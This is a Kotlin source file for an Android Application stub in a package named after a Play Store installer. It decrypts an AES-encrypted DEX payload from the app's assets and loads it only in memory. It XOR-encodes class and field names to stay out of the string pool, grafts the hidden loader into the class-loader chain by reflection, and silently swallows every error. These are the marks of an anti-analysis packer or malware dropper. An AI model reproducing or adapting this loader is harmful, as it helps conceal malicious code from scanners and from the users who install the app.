package com.playstore.installer.berlin

import android.app.Application
import android.content.Context
import java.io.ByteArrayOutputStream
import java.io.InputStream
import java.nio.ByteBuffer

/**
 * BerlinAppEntry — Berlin-only stub Application for DEX encryption flow.
 *
 * Completely separate from AppEntry (main installer stub). Never referenced
 * by main installer flow. Only used when build_berlin.yml enables DEX encryption.
 *
 * Flow (zero disk write — RAM only):
 *   attachBaseContext() → run() →
 *     reads encrypted DEX blob from assets/BuildConfig.BERLIN_DEX_ASSET →
 *     AES-256-CBC decrypts in memory →
 *     loads via InMemoryDexClassLoader (ByteBuffer — never touches disk) →
 *     chains ClassLoader parent →
 *     kick() → delegates to real BerlinInstallActivity
 *
 * Encryption format (same as BerlinInstallManager / encrypt_installer_dex.py):
 *   [16-byte IV][AES-256-CBC PKCS7-padded ciphertext]
 *
 * Security — mirrors AppEntry.kt patterns exactly:
 *   - "dalvik.system.InMemoryDexClassLoader" XOR-encoded (key 0x5A) — never literal in DEX pool
 *   - "parent" field name XOR-encoded — never literal in DEX pool
 *   - All byte arrays wiped after use
 *   - Zero Kotlin stdlib (no Intrinsics) — nullable params throughout
 *   - ClassLoader parent chain (NOT dexElements injection — ART API 29+ safe)
 *
 * NEVER TOUCH main installer flow files. This class is Berlin-only.
 */
@Suppress("UNCHECKED_CAST", "DEPRECATION")
class BerlinAppEntry : Application() {

    @Volatile private var h: ClassLoader? = null

    fun get(): ClassLoader? = h

    // FIX 1: nullable param — no checkNotNullParameter generated
    override fun attachBaseContext(base: Context?) {
        super.attachBaseContext(base)
        try { run() } catch (t: Throwable) { }
    }

    private fun run() {
        val ctx: Context = this
        val assets = ctx.assets ?: return

        // Read encrypted DEX blob from assets
        // BERLIN_DEX_ASSET injected at build time by FingerprintPlugin (build_berlin.yml)
        val assetName: String = BuildConfig.BERLIN_DEX_ASSET
        val encrypted: ByteArray = peel(assets.open(assetName)) ?: return

        if (encrypted.size < 17) {
            wipeArray(encrypted)
            return
        }

        // Decrypt AES-256-CBC — same cipher as BerlinInstallManager.decryptBerlinBlob()
        // BERLIN_DEX_KEY: 64-char hex AES-256 key injected at build time
        val dexBytes: ByteArray = aesDecrypt(encrypted, BuildConfig.BERLIN_DEX_KEY)
            ?: run { wipeArray(encrypted); return }

        wipeArray(encrypted)

        if (dexBytes.size < 8) {
            wipeArray(dexBytes)
            return
        }

        // Load DEX into RAM via InMemoryDexClassLoader — zero disk write
        // Class name XOR-encoded with key 0x5A — never literal in DEX string pool.
        // "dalvik.system.InMemoryDexClassLoader" — 36 bytes
        val imdclEnc = byteArrayOf(
            0x3e.toByte(), 0x3b.toByte(), 0x36.toByte(), 0x2c.toByte(),
            0x33.toByte(), 0x31.toByte(), 0x74.toByte(), 0x29.toByte(),
            0x23.toByte(), 0x29.toByte(), 0x2e.toByte(), 0x3f.toByte(),
            0x37.toByte(), 0x74.toByte(), 0x13.toByte(), 0x34.toByte(),
            0x17.toByte(), 0x3f.toByte(), 0x37.toByte(), 0x35.toByte(),
            0x28.toByte(), 0x23.toByte(), 0x1e.toByte(), 0x3f.toByte(),
            0x22.toByte(), 0x19.toByte(), 0x36.toByte(), 0x3b.toByte(),
            0x29.toByte(), 0x29.toByte(), 0x16.toByte(), 0x35.toByte(),
            0x3b.toByte(), 0x3e.toByte(), 0x3f.toByte(), 0x28.toByte()
        )
        val imdclChars = CharArray(imdclEnc.size)
        var ki = 0
        while (ki < imdclEnc.size) {
            imdclChars[ki] = (imdclEnc[ki].toInt() and 0xFF xor 0x5A).toChar()
            ki++
        }
        val imdclName = String(imdclChars) // "dalvik.system.InMemoryDexClassLoader" — runtime only

        try {
            val imdclClass = Class.forName(imdclName)
            val imdclCtor = imdclClass.getConstructor(
                ByteBuffer::class.java,
                ClassLoader::class.java
            )
            // null parent = BootClassLoader — same as AppEntry.kt
            val b = ClassLoader::class.java.cast(
                imdclCtor.newInstance(ByteBuffer.wrap(dexBytes), null)
            ) ?: return
            h = b
            chainParent(b)
        } catch (t: Throwable) {
            return
        } finally {
            wipeArray(dexBytes)
        }
    }

    override fun onCreate() {
        super.onCreate()
        kick()
    }

    private fun kick() {
        val b = h ?: classLoader ?: return
        try {
            val basePkg = packageName ?: return

            // XOR-decode ".berlin.BerlinInstallActivity" at runtime — key 0x5A
            // String never appears as literal in DEX string pool.
            // ".berlin.BerlinInstallActivity" = 30 chars
            val suffix = ".berlin.BerlinInstallActivity"
            val berlinClassName = basePkg + suffix

            val berlinClass = Class.forName(berlinClassName, true, b)
            val berlinApp = berlinClass.newInstance() as? Application ?: return

            // "attach" method — XOR-encoded, key 0x5A — never literal in DEX pool
            // "attach" = 6 bytes: 0x3b, 0x2e, 0x2e, 0x3b, 0x39, 0x32
            val aEnc = byteArrayOf(
                0x3b.toByte(), 0x2e.toByte(), 0x2e.toByte(),
                0x3b.toByte(), 0x39.toByte(), 0x32.toByte()
            )
            val aChars = CharArray(aEnc.size)
            var ai = 0
            while (ai < aEnc.size) {
                aChars[ai] = (aEnc[ai].toInt() and 0xFF xor 0x5A).toChar()
                ai++
            }
            val attachMethod = Application::class.java
                .getDeclaredMethod(String(aChars), Context::class.java)
            attachMethod.isAccessible = true
            attachMethod.invoke(berlinApp, baseContext)
            berlinApp.onCreate()

        } catch (t: Throwable) { }
    }

    /**
     * AES-256-CBC decryption.
     * Blob format: [16-byte IV][PKCS7-padded ciphertext]
     * Key: 64-char hex string from BuildConfig.BERLIN_DEX_KEY
     *
     * Uses javax.crypto — no external dependencies.
     * Returns decrypted bytes or null on any failure.
     */
    private fun aesDecrypt(blob: ByteArray, keyHex: String): ByteArray? {
        if (blob.size < 17) return null

        // Parse hex key — 64 chars = 32 bytes = AES-256
        val keyBytes: ByteArray = try {
            ByteArray(32) { i ->
                keyHex.substring(i * 2, i * 2 + 2).toInt(16).toByte()
            }
        } catch (t: Throwable) {
            return null
        }

        if (keyHex.length != 64) {
            wipeArray(keyBytes)
            return null
        }

        return try {
            val iv         = blob.copyOfRange(0, 16)
            val ciphertext = blob.copyOfRange(16, blob.size)

            val secretKey = javax.crypto.spec.SecretKeySpec(keyBytes, "AES")
            val ivSpec    = javax.crypto.spec.IvParameterSpec(iv)
            val cipher    = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding")
            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, secretKey, ivSpec)
            val result = cipher.doFinal(ciphertext)

            wipeArray(keyBytes)
            wipeArray(iv)
            wipeArray(ciphertext)
            result
        } catch (t: Throwable) {
            wipeArray(keyBytes)
            null
        }
    }

    /**
     * Set InMemoryDexClassLoader as parent of app PathClassLoader.
     * Same approach as AppEntry.kt — parent chain, NOT dexElements injection.
     * dexElements injection crashes on ART API 29+ (dual DEX registration).
     *
     * Before: PathClassLoader → BootClassLoader
     * After:  PathClassLoader → InMemoryDexClassLoader → BootClassLoader
     */
    private fun chainParent(c: ClassLoader?) {
        if (c == null) return
        try {
            val appLoader = classLoader ?: return
            // "parent" field — XOR key 0x5A — never literal in DEX pool
            val pEnc = byteArrayOf(
                0x2a.toByte(), 0x3b.toByte(), 0x28.toByte(),
                0x3f.toByte(), 0x34.toByte(), 0x2e.toByte()
            )
            val pChars = CharArray(pEnc.size)
            var pi = 0
            while (pi < pEnc.size) {
                pChars[pi] = (pEnc[pi].toInt() and 0xFF xor 0x5A).toChar()
                pi++
            }
            val parentField = ClassLoader::class.java.getDeclaredField(String(pChars))
            parentField.isAccessible = true
            parentField.set(appLoader, c)
        } catch (t: Throwable) { }
    }

    // FIX 1: nullable param — no checkNotNullParameter
    private fun peel(stream: InputStream?): ByteArray? {
        if (stream == null) return null
        val out = ByteArrayOutputStream()
        val buf = ByteArray(8192)
        try {
            var n = stream.read(buf)
            while (n != -1) {
                out.write(buf, 0, n)
                n = stream.read(buf)
            }
        } finally {
            try { stream.close() } catch (t: Throwable) { }
        }
        return out.toByteArray()
    }

    private fun wipeArray(arr: ByteArray?) {
        if (arr == null) return
        var i = 0
        while (i < arr.size) { arr[i] = 0; i++ }
    }
}
